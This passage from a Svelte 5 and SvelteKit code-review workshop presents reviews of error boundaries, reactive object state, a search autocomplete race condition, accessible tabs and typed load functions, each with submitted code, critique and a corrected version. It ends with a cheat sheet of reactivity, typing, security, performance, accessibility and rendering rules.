<!-- +layout.svelte -->
<script lang="ts">
  import Sidebar from '$lib/components/Sidebar.svelte';
  import Header from '$lib/components/Header.svelte';
</script>

<Header />
<div class="app">
  <Sidebar />
  <main>
    {@render children?.()}
  </main>
</div>
```

**Senior review:**
1. **No error boundary** — If any child page throws during rendering, the error propagates up and crashes the entire layout. The sidebar, header, and navigation disappear. The user has no way to navigate to a working page.
2. **No `+error.svelte` file** — SvelteKit provides an error page mechanism via `+error.svelte`. Without it, errors fall through to the root error page, which has no access to the layout (sidebar, header). The user loses all navigation.
3. **No loading state** — During client-side navigation, there is no visual feedback that the page is loading. Users click a link and nothing visible happens until the load function completes.

**Corrected code:**
```svelte
<!-- +layout.svelte -->
<script lang="ts">
  import Sidebar from '$lib/components/Sidebar.svelte';
  import Header from '$lib/components/Header.svelte';
</script>

<Header />
<div class="app">
  <Sidebar />
  <main>
    <svelte:boundary>
      {@render children?.()}
      {#snippet failed(error, reset)}
        <div class="error-container">
          <h2>Something went wrong</h2>
          <p>{error?.message ?? 'An unexpected error occurred'}</p>
          <button onclick={reset}>Try again</button>
          <a href="/">Go home</a>
        </div>
      {/snippet}
    </svelte:boundary>
  </main>
</div>
```
```svelte
<!-- +error.svelte (create this file alongside +layout.svelte) -->
<script lang="ts">
  import { page } from '$app/state';
</script>

<div class="error-page">
  <h1>{page.status}</h1>
  <p>{page.error?.message}</p>
  <a href="/">Return home</a>
</div>
```

**What this teaches:** Error boundaries keep your app resilient. When a child component fails, the boundary catches the error and shows a fallback UI while keeping the rest of the layout intact. Without boundaries, one broken component takes down the entire page. `<svelte:boundary>` catches render errors; `+error.svelte` catches load/action errors.

---

### Review #17 — Uncontrolled Re-Renders with Object State

**Context:** The developer built a settings panel where changing one setting causes all settings to re-render, even settings that did not change.

**Submitted code:**
```svelte
<script lang="ts">
  let settings = $state({
    theme: 'dark',
    fontSize: 16,
    language: 'en',
    notifications: true,
    autoSave: false,
    sidebarOpen: true
  });

  function updateSetting(key: string, value: unknown) {
    settings = { ...settings, [key]: value };
  }
</script>

<SettingRow label="Theme" value={settings.theme}
  onchange={(v) => updateSetting('theme', v)} />
<SettingRow label="Font Size" value={settings.fontSize}
  onchange={(v) => updateSetting('fontSize', v)} />
<!-- ... 20 more settings -->
```

**Senior review:**
1. **Replacing the entire object on each change** — `settings = { ...settings, [key]: value }` creates a new object reference every time any setting changes. Since all `<SettingRow>` components receive props from this same object, every setting row re-renders when any single setting changes. With 20+ settings, this creates unnecessary work.
2. **Untyped key parameter** — `key: string` and `value: unknown` bypass type checking. Any typo in the key name silently adds a new property instead of updating the intended one.
3. **Missing granularity** — Deep reactivity in Svelte 5 `$state` already tracks individual property changes. There is no need to spread and replace the object — direct mutation works and is more efficient.

**Corrected code:**
```svelte
<script lang="ts">
  interface Settings {
    theme: 'light' | 'dark';
    fontSize: number;
    language: string;
    notifications: boolean;
    autoSave: boolean;
    sidebarOpen: boolean;
  }

  let settings = $state<Settings>({
    theme: 'dark',
    fontSize: 16,
    language: 'en',
    notifications: true,
    autoSave: false,
    sidebarOpen: true
  });

  // Direct property mutation — Svelte 5 tracks individual properties
</script>

<SettingRow label="Theme" value={settings.theme}
  onchange={(v) => { settings.theme = v; }} />
<SettingRow label="Font Size" value={settings.fontSize}
  onchange={(v) => { settings.fontSize = v; }} />
```

**What this teaches:** Svelte 5's `$state` creates deep reactive proxies. When you mutate `settings.theme`, only components that read `settings.theme` re-render. Spreading to create a new object defeats this granularity by changing the object reference, which makes every component that reads any property re-render. Embrace mutation with `$state` — it is the designed usage pattern.

---

### Review #18 — Race Condition in Search Autocomplete

**Context:** The developer built a search input with autocomplete suggestions fetched from the server. Users report that sometimes the wrong suggestions appear.

**Submitted code:**
```svelte
<script lang="ts">
  let query = $state('');
  let suggestions = $state<string[]>([]);

  $effect(() => {
    if (query.length > 2) {
      fetch(`/api/search?q=${query}`)
        .then(r => r.json())
        .then(data => {
          suggestions = data;
        });
    } else {
      suggestions = [];
    }
  });
</script>

<input bind:value={query} />
{#each suggestions as s}
  <div class="suggestion">{s}</div>
{/each}
```

**Senior review:**
1. **Race condition — responses arrive out of order** — If the user types "cap" then quickly changes to "car", two requests fire: `/api/search?q=cap` and `/api/search?q=car`. If the "cap" response arrives after "car" (due to network latency), the suggestions show results for "cap" while the input shows "car".
2. **No debouncing** — Every character change fires a request. Typing "capsule" sends requests for "cap", "caps", "capsu", "capsul", "capsule" — 5 unnecessary requests. Only the last one matters.
3. **No URL encoding** — The query is interpolated directly into the URL without encoding. A search for "cap & hat" produces an invalid URL. Use `URLSearchParams` or `encodeURIComponent`.

**Corrected code:**
```svelte
<script lang="ts">
  let query = $state('');
  let suggestions = $state<string[]>([]);

  $effect(() => {
    if (query.length <= 2) {
      suggestions = [];
      return;
    }

    const currentQuery = query;
    const controller = new AbortController();

    const timeout = setTimeout(async () => {
      try {
        const params = new URLSearchParams({ q: currentQuery });
        const res = await fetch(`/api/search?${params}`, {
          signal: controller.signal
        });
        const data = await res.json();

        // Only update if query hasn't changed while waiting
        if (query === currentQuery) {
          suggestions = data;
        }
      } catch (e) {
        if ((e as Error).name !== 'AbortError') {
          console.error('Search failed:', e);
        }
      }
    }, 300);

    return () => {
      clearTimeout(timeout);
      controller.abort();
    };
  });
</script>

<input bind:value={query} />
{#each suggestions as s}
  <div class="suggestion">{s}</div>
{/each}
```

**What this teaches:** Network requests are asynchronous and unordered. When user input triggers requests faster than the network can respond, responses arrive out of sequence. The three-part solution is: debounce (wait for the user to stop typing), abort (cancel in-flight requests on cleanup), and verify (check that the response still matches the current query).

---

### Review #19 — Inaccessible Tab Component

**Context:** The developer built a custom tab component using divs and click handlers. Keyboard users cannot navigate between tabs.

**Submitted code:**
```svelte
<script lang="ts">
  let activeTab = $state(0);
  let { tabs } = $props();
</script>

<div class="tabs">
  {#each tabs as tab, i}
    <div
      class="tab"
      class:active={activeTab === i}
      onclick={() => activeTab = i}
    >
      {tab.label}
    </div>
  {/each}
</div>

<div class="panel">
  {tabs[activeTab].content}
</div>
```

**Senior review:**
1. **Missing ARIA roles** — Tabs must use `role="tablist"` on the container, `role="tab"` on each tab, and `role="tabpanel"` on the content panel. Without these, screen readers cannot announce the component's purpose or state.
2. **No keyboard navigation** — Arrow keys should move between tabs, Home/End should jump to first/last tab, and Enter/Space should activate a tab. Using `<div>` instead of `<button>` means tabs are not focusable and do not respond to keyboard events.
3. **Missing aria-selected and aria-controls** — Screen readers need `aria-selected` to know which tab is active, and `aria-controls` to associate each tab with its panel. Without these, the relationship between tabs and content is invisible to assistive technology.

**Corrected code:**
```svelte
<script lang="ts">
  interface Tab {
    label: string;
    content: string;
  }

  let { tabs }: { tabs: Tab[] } = $props();
  let activeTab = $state(0);

  function handleKeydown(e: KeyboardEvent) {
    switch (e.key) {
      case 'ArrowRight':
        activeTab = (activeTab + 1) % tabs.length;
        break;
      case 'ArrowLeft':
        activeTab = (activeTab - 1 + tabs.length) % tabs.length;
        break;
      case 'Home':
        activeTab = 0;
        break;
      case 'End':
        activeTab = tabs.length - 1;
        break;
    }
  }
</script>

<div class="tabs" role="tablist" aria-label="Content tabs">
  {#each tabs as tab, i}
    <button
      role="tab"
      id="tab-{i}"
      aria-selected={activeTab === i}
      aria-controls="panel-{i}"
      tabindex={activeTab === i ? 0 : -1}
      onclick={() => activeTab = i}
      onkeydown={handleKeydown}
    >
      {tab.label}
    </button>
  {/each}
</div>

<div
  role="tabpanel"
  id="panel-{activeTab}"
  aria-labelledby="tab-{activeTab}"
  tabindex={0}
>
  {tabs[activeTab].content}
</div>
```

**What this teaches:** Interactive components must follow WAI-ARIA patterns. The tab pattern specifically requires roving tabindex (only the active tab is in the tab order), arrow key navigation, and proper ARIA relationships. Test with a screen reader (VoiceOver, NVDA) and keyboard-only navigation. If a user cannot use your component without a mouse, it is broken.

---

### Review #20 — Load Function Without Proper Typing

**Context:** The developer built a multi-page app with shared layout data and page-specific data. Types are missing throughout, and the data flow is unclear.

**Submitted code:**
```typescript
// +layout.server.ts
export const load = async ({ locals }) => {
  return {
    user: locals.user,
    notifications: await getNotifications(locals.user?.id)
  };
};
```
```typescript
// +page.server.ts
export const load = async ({ params, parent }) => {
  const layoutData = await parent();
  const project = await getProject(params.id, layoutData.user?.id);
  return { project };
};
```
```svelte
<!-- +page.svelte -->
<script>
  let { data } = $props();
</script>

<h1>{data.project.name}</h1>
<p>Welcome, {data.user.name}</p>
<p>You have {data.notifications.length} notifications</p>
```

**Senior review:**
1. **No TypeScript in component** — The `<script>` tag is missing `lang="ts"`. The component has zero type checking. `data.project.name`, `data.user.name`, and `data.notifications.length` could all be `undefined` and TypeScript would not catch it.
2. **`parent()` creates a waterfall** — Calling `await parent()` in the page load function forces the page load to wait for the layout load to complete before starting. If the page data does not actually depend on layout data, this is an unnecessary sequential dependency that slows page load.
3. **Unsafe property access without null checks** — `locals.user?.id` uses optional chaining, suggesting `user` can be null. But `data.user.name` in the template does not use optional chaining. If the user is not logged in, the page crashes.

**Corrected code:**
```typescript
// +layout.server.ts
import type { LayoutServerLoad } from './$types';

export const load: LayoutServerLoad = async ({ locals }) => {
  return {
    user: locals.user,
    notifications: locals.user
      ? await getNotifications(locals.user.id)
      : []
  };
};
```
```typescript
// +page.server.ts
import type { PageServerLoad } from './$types';

export const load: PageServerLoad = async ({ params }) => {
  // Don't call parent() unless you actually need layout data
  const project = await getProject(params.id);

  if (!project) {
    error(404, 'Project not found');
  }

  return { project };
};
```
```svelte
<!-- +page.svelte -->
<script lang="ts">
  let { data } = $props();
</script>

<h1>{data.project.name}</h1>
{#if data.user}
  <p>Welcome, {data.user.name}</p>
  <p>You have {data.notifications.length} notifications</p>
{:else}
  <p><a href="/login">Sign in</a> to see notifications</p>
{/if}
```

**What this teaches:** SvelteKit's type generation is one of its most powerful features, but only if you use it. Always use `lang="ts"`, always annotate load functions with the generated types from `$types`, and always handle nullable data in the template. The `parent()` function should only be called when you genuinely need layout data — it serializes your data loading.

---

---

## Workshop Appendix: Review Patterns Cheat Sheet

After completing all 20 reviews, you should be able to recognize these patterns instantly. This summary distills the workshop into actionable rules.

### Reactivity Patterns

**Rule 1: Pure computations use `$derived`, side effects use `$effect`.**
If you are setting a reactive variable based on other reactive variables inside `$effect`, stop. That is `$derived`. Effects are for DOM manipulation, network requests, timers, and event listeners — anything that interacts with the outside world. Derived values are for transforming reactive data into other reactive data without leaving the reactive system.

**Rule 2: `$state` objects support direct mutation — embrace it.**
Svelte 5's reactivity system tracks individual property reads and writes on `$state` objects. When you write `settings.theme = 'dark'`, Svelte knows to update only the components that read `settings.theme`. Spreading (`settings = { ...settings, theme: 'dark' }`) creates a new object reference, defeating this granularity. Unlike React's `useState` which requires immutable updates, Svelte's `$state` is designed for mutation.

**Rule 3: Keys are identity, indices are positions.**
Never use array indices as `{#each}` keys for lists that can be reordered, filtered, or mutated. An index says "this is the third item" — a key says "this is item #abc-123." When you sort a list, indices change but keys do not. Svelte uses keys to match DOM nodes to data across updates. Without proper keys, transitions fire on wrong elements, event handlers close over stale data, and input elements lose focus.

**Rule 4: Effect cleanup is mandatory for subscriptions.**
Every `addEventListener` must have a matching `removeEventListener` in the cleanup. Every `setTimeout` must have a matching `clearTimeout`. Every `fetch` should have an `AbortController`. Every subscription must be unsubscribed. The `$effect` return function is not optional — it is a contract. Failing to clean up creates memory leaks that accumulate over time and eventually crash the application.

### Type Safety Patterns

**Rule 5: Type your props, type your load functions, type your actions.**
TypeScript cannot help you if you do not give it types. Untyped props mean no autocomplete, no refactoring support, and no compile-time error detection. Untyped load functions mean `data` is `any` in your template. Untyped actions mean `form` is `any`. The five minutes you spend writing types saves hours of debugging runtime errors.

**Rule 6: Constrain string parameters with union types.**
A prop typed as `string` accepts any string, including typos. A prop typed as `'primary' | 'secondary' | 'danger'` only accepts valid values. Union types turn runtime "why isn't my style applying?" bugs into compile-time "this string is not assignable" errors. Use them for variants, sizes, status values, and any prop with a fixed set of valid values.

### Security Patterns

**Rule 7: Every `{@html}` is a potential XSS vulnerability until sanitized.**
When reviewing code, search for `{@html}`. Every instance must either render content from a trusted source (your own codebase, not user input) or be sanitized with DOMPurify. There are no exceptions. A single unsanitized `{@html}` is the most common vulnerability in Svelte applications.

**Rule 8: Never expose secrets in load function returns.**
Everything returned from a load function is serialized and sent to the client. This includes `+page.server.ts` load functions — the "server" in the name means the function runs on the server, not that the return value stays on the server. Database URLs, API keys, internal user IDs, and debug information must never appear in load function return values.

**Rule 9: Authentication requires hashing, signing, and proper cookie attributes.**
Plain-text password comparison is a career-ending mistake. Unsigned session tokens are an impersonation vector. Missing `httpOnly` on session cookies means XSS equals session hijack. Missing `SameSite` means CSRF is trivially exploitable. Authentication code must be reviewed by a senior developer before merging.

### Performance Patterns

**Rule 10: Debounce user-triggered network requests.**
Search inputs, autocomplete, and filter changes should not fire a network request on every keystroke. Debounce with a 200-500ms delay, abort in-flight requests when new input arrives, and verify the response matches the current query to prevent race conditions.

**Rule 11: Never call functions in template expressions for expensive operations.**
`{#each getItems() as item}` re-evaluates `getItems()` on every render. Use `$derived` instead — it memoizes the result and only recomputes when dependencies change. For cheap operations (formatting a single string), a function call is fine. For operations that iterate arrays, sort data, or make calculations, always use `$derived`.

### Accessibility Patterns

**Rule 12: Use native HTML elements before building custom ones.**
`<dialog>` provides focus trapping, Escape key handling, backdrop, and screen reader announcements for free. `<button>` provides keyboard activation, focus management, and implicit ARIA roles. `<details>/<summary>` provides disclosure widgets. Before building a custom component, check if a native element already does what you need.

**Rule 13: Test with keyboard-only navigation.**
Unplug your mouse and try to use your application. If you cannot reach an interactive element with Tab, activate it with Enter/Space, or navigate a complex widget with arrow keys, keyboard users cannot use your application. This includes people with motor impairments, power users who prefer keyboard navigation, and screen reader users.

### SSR/Hydration Patterns

**Rule 14: Never read browser APIs at the top level of `<script>`.**
`window`, `document`, `navigator`, `localStorage`, and `sessionStorage` do not exist during SSR. Code at the top level of `<script>` runs on both server and client. Move browser API access into `$effect` (client-only) or guard with `import { browser } from '$app/environment'`. Use the `mounted` flag pattern for conditional rendering that must differ between server and client without causing hydration mismatches.

**Rule 15: Choose rendering mode based on data freshness requirements, not performance assumptions.**
SSG is not "faster SSR." SSG is for content that changes at deploy time. SSR is for content that changes per-request. CSR is for content behind authentication that has no SEO requirement. Choosing the wrong rendering mode causes stale data in production, which is worse than a 100ms TTFB increase.

---

*End of workshop. Revisit these exercises periodically as you build more complex applications. The patterns that trip up junior developers are the same ones that cause production incidents at scale.*
